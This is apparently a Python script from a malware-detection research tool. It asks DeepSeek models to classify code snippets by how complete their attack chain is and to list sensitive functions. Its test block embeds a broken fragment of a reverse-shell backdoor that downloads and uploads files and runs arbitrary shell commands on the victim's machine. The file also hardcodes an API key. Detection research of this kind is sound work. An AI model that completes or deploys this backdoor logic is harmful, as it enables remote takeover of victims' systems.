import os
from openai import OpenAI


ASSERTION_PROMPT = """Give you the follow code snippet {code_snippet},
                Follow this structured assessment framework:
                
                Classification:
                1. Full Attack Chain:
                    Definition: A malicious implementation that contains all components to execute its primary malicious objective and can do harm to the target system.
                2. Core Attack Chain:
                    Definition: An attack that possesses core malicious components but lacks one or more critical elements required to achieved its primary objective. The potential for harm is high, but the incomplete logic chain prevents the attack from reaching its damaging conclusion.
                3. Fragmented Attack Chain:
                    Definition: Consists of isolated, standalone malicious code fragments or modules. These elements lack logical connectivity and a demonstrable sequence of execution.
                    Key Differentiator: Isolated malice without integration. You should recognize individual malicious capabilities but note the complete absence of a connecting logic or workflow between them.
                4. Benign Artifact:
                    Definition: Exhibits no evidence of malicious intent, functionality, or code. Its behavior, code patterns, and purpose are consistent with and fully explainable by legitimate activities, such as system administration, software development, debugging, or authorized security research. 
                    Key Differentiator: Fully explainable by legitimate purposes. You should find zero indicators of malice and be able to attribute all components and behaviors to known, benign activities.
            
                Provide structured response with:
                - **Classification:** "Full Attack Chain" | "Core Attack Chain" | "Fragmented Attack Chain" | "Benign Artifact"
                - **Missing Components:** If classified as "Core" or "Fragmented", specify what is missing to reach the next level.
                - **Potential Impact:** Describe the potential impact if this attack were fully realized.
                - **Threat Level:** High/Medium/Low based on current implementation"""

CHECK_PROMPT = """Analyze the previous classification response's Missing Components part. 
                If the inability to reach the next level is solely caused by non-logical issues such as syntax errors, missing imports, missing error handling, placeholder or fake IP addresses, minor formatting/encoding problems, or other superficial implementation faults, 
                ignore those issues and re-evaluate the code as if they were fixed. 
                
                
                Focus only on the logical capabilities that determine attack chain completeness.
                
                Produce a structured English response with these fields:
                - Classification: "Full Attack Chain" | "Core Attack Chain" | "Fragmented Attack Chain" | "Benign Artifact"
                - Missing Components: If classified as "Core" or "Fragmented", list the specific logical capabilities missing to reach the next level. Ignore superficial blockers described above.
                - Potential Impact: Describe consequences if the attack were fully realized.
                - Threat Level: High/Medium/Low based on the logical capabilities present after ignoring superficial faults.

                Return only the structured response in plain English using the field names above."""
SYSTEM_PROMPT = """You are a professional cybersecurity analyst tasked with analyzing code snippets from victim's perspective to classify given code snippets."""
    
        #Also ignore persistence mechanisms (e.g., file-based persistence, registry entries, scheduled tasks, or other long-term storage/auto-start mechanisms) when determining whether the attack reaches the next level. 
class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )
        self.conversation_history = []

    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content



    def reset_conversation(self, system_prompt=None):
        """清空会话历史，可选设置新的 system_prompt"""
        self.conversation_history = []
        if system_prompt:
            self.conversation_history.append({"role": "system", "content": system_prompt})

    def get_conversation_history(self):
        """返回当前会话历史的浅拷贝"""
        return list(getattr(self, "conversation_history", []))
    
    
    def malicious_assertion_check(self):
        self.conversation_history.append({"role": "user", "content": CHECK_PROMPT})
        
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=self.conversation_history
        )
        return completion.choices[0].message.content
    
    def malicious_assertion(self, code_snippet):
        user_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
        self.conversation_history.append({"role": "system", "content": SYSTEM_PROMPT})
        self.conversation_history.append({"role": "user", "content": user_prompt})
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=self.conversation_history
        )
        self.conversation_history.append({"role": "assistant", "content": completion.choices[0].message.content})
        return completion.choices[0].message.content
    
    
    def function_behavior_generate(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to generate its function behavior."
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = '''
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name ,"wb") as output_file:
        output_file.write(get_response.content)
def send_over_json(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
def recv_over_json():
    data = ""
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
def shell():
        command = recv_over_json()
        if command == 'q':
        elif command[:2] == 'cd':
                os.chdir(command[3:])
        elif command[:8] == 'download':
            with open(command[9:] ,'rb' ) as file:
                send_over_json(file.read())
        elif command[:6] == 'upload':
            with open(command[7:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
                download(command[4:])
                send_over_json("[+] Downloaded File From Specified URL")
                send_over_json("[+] Failed to download that file")
        elif command[:5] == "start":
                subprocess.Popen(command[6:] ,shell=True)
                send_over_json("[+] %s started on victim's machine."%(command[6:]))
                send_over_json("[-] %s failed to start on victim's machine. "%(command[6:]))
            proc = subprocess.Popen(command ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            send_over_json(result.decode('utf-8'))

'''

    llm_evaluate = LLM_Evaluate(
        api_key="1d368dbf-5a67-448f-9356-49f9efa2fc13",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.malicious_assertion(code_snippet)
    print("LLM Malicious Assertion Result:")
    print(sensitive_api_result)
